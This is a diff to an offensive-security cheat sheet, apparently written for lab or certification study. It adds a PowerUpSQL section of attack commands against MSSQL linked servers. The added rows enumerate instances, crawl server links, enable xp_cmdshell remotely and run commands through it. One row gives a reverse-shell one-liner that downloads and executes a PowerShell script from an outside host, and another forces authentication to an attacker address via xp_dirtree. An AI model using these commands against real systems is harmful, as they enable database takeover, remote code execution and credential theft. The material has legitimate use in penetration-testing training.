@@ -15,10 +15,11 @@
 - [9. TCP Port Redirection via powercat](#TCP-Port-Redirection-via-powercat)
 - [10. MSSQL Useful Queries](#MSSQL-Useful-Queries)
 - [11. MSSQLPwner](#MSSQLPwner)
-- [12. NTLM Relay](#NTLM-Relay)
-- [13. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)
-- [14. Domain Enumeration](#Domain-Enumeration)
-- [15. BloodyAD Cheetsheet](#BloodyAD-Cheetsheet)
+- [12. PowerUPSQL](#PowerUPSQL)
+- [13. NTLM Relay](#NTLM-Relay)
+- [14. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)
+- [15. Domain Enumeration](#Domain-Enumeration)
+- [16. BloodyAD Cheetsheet](#BloodyAD-Cheetsheet)
 
 # Tunneling - Ligolo-NG
 
@@ -246,6 +247,24 @@ Execute command through custom assembly:
 
 Retrieving password from the linked server:
 - `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password`
+
+# PowerUPSQL
+
+| Purpose | Command |
+|---------|---------|
+| Get MSSQL Instances in the current domain | `Get-SQLInstanceDomain` |
+| Test for access on the instances | `Get-SQLInstanceDomain \| Get-SQLConnectionTestThreaded -Verbose` |
+| Get INFO about the accessible instances | `Get-SQLInstanceDomain \| Get-SQLServerInfo -Verbose` |
+| Search Database Links | `Get-SQLServerLink -Instance dcorp-mssql -Verbose` |
+| Get nested links using PowerUpSQL | `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose` |
+| Query nested links using OpenQuery | `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')` |
+| Enable xp_cmdshell on remote link | `EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"` |
+| Execute commands using PowerUpSQL | `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" \| ft` |
+| Execute command manually (GUI) | `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')` |
+| Reverse Shell | `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.26/Invoke-PowershellTcp.ps1'')'" \| ft` |
+| Audit for issues | `Invoke-SQLAudit -Verbose` |
+| Escalate to sysadmin | `Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1` |
+| Execute xp_dirtree | `sqlcmd -Q "xp_dirtree '\\\\10.10.14.51\\test'"` |
 
 # NTLM Relay:
 *Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*
